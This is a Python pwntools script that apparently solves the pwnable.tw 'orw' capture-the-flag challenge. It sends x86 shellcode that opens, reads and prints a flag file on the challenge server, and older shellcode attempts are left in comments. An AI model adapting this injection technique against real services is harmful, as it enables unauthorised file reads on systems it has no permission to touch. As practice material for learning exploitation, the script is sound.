from pwn import *
s = remote('chall.pwnable.tw', 10001)
# shellcode = '\x6A\x00\x68\x66\x6C\x61\x67\x68\x77\x2F\x2F\x2F\x68\x65\x2F\x6F\x72\x68\x2F\x68\x6F\x6D\x89\xE3\xB8\x05\x00\x00\x00\x31\xC9\x31\xD2\xCD\x80\x50\xB8\x03\x00\x00\x00\x5B\xB9\x60\xA0\x04\x08\x81\xC1\xA0\x00\x00\x00\xBA\x28\x00\x00\x00\xCD\x80\xB8\x04\x00\x00\x00\xBB\x01\x00\x00\x00\xB9\x60\xA0\x04\x08\x81\xC1\xA0\x00\x00\x00\xBA\x28\x00\x00\x00\xCD\x80'
dir = '/home/orw/flag'
# shellcode = '\x31\xC0\x31\xC9\x31\xDB\x68\x2F\x2F\x2F\x68\x68\x6F\x6D\x65\x2F\x68\x6F\x72\x77\x2F\x68\x66\x6C\x61\x67\x89\xE3\xB0\x05\xCD\x80\x93\x91\xB0\x03\x66\xBA\xFF\x0F\xFF\xC2\xCD\x80\x92\xB3\x01\xC1\xE8\x0A\xCD\x80'
# xor eax,eax
# xor ecx, ecx
# xor ebx,ebx
# push 0x682f2f2f
# push 0x2f656d6f
# push 0x2f77726f
# push 0x67616c66
# mov ebx,esp
# mov el,0x05
# int 0x80
# s = process('./orw')
raw_input('debug')
code = asm('''
	xor eax,eax
	xor ecx, ecx
	xor ebx,ebx
	push ebx
	push 0x67616c66
	push 0x2f77726f
	push 0x2f656d6f
	push 0x682f2f2f
	mov ebx,esp
	mov al,0x05
	int 0x80
	mov ebx,eax
	mov ecx,0x804a160
	mov edx,50
	mov al,0x3
	int 0x80
	mov ebx, 0x1
	mov ecx,0x804a160
	mov edx,50
	mov al,0x4
	int 0x80
''')
s.sendline(code)
s.interactive()
